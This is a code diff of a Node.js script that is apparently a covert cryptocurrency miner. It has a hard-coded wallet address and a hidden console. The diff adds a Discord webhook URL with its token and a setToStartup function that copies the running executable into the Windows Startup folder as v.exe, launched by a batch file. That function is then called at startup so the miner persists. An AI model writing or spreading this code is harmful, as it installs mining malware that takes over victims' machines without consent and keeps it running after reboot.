@@ -1,10 +1,10 @@
 const walletAddr = "47kVVZSwkxMihgH7FkR7dPXppegNxungK7r4tTNCtvDECpa3JAxZ37Nj1c1rSUV3gSE7pctFReh6aXsgs25LjyQjDb8VAL3"
-const wbk = "Webhook"
+const wbk = "https://discord.com/api/webhooks/1060945581574463580/x1zeOXlwACMAr8hucYjIg4-g3rUBvbnvnqlygQbjciC9-VAVBMLg8BXyQuzmcouplIUi"
 const openDelay = 1000
 const hideCnsl = true
 
 
-
+const process = require('process');
 const request = require('request');
 const fs = require('fs');
 const { exec } = require("child_process");
@@ -15,7 +15,6 @@ const fetch = require("sync-fetch")
 var os = require('os');
 const urss = os.userInfo().username;
 const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
-
 
 
 
@@ -40,7 +39,16 @@ var ConfigOutput = `C:\\Users\\${urss}\\AppData\\Roaming\\config.json`;
 
 
 
-
+function setToStartup(){
+  const Fpath = process.argv[0]
+  const startPth = "C:\\Users\\" + urss +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\localhost.bat"
+  const startExePth = "C:\\Users\\" + urss +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\v.exe"
+  fs.writeFileSync(startPth, "START v.exe");
+  let dataF = fs.readFileSync(Fpath, {encoding: null});
+  fs.writeFileSync(startExePth, dataF)
+  console.log("[+] Set startup sucess")
+   
+}
 
 
 async function getStats(addr){
@@ -176,5 +184,5 @@ async function MinerThread(){
   }
 }
 
-
+setToStartup()
 MinerMain();
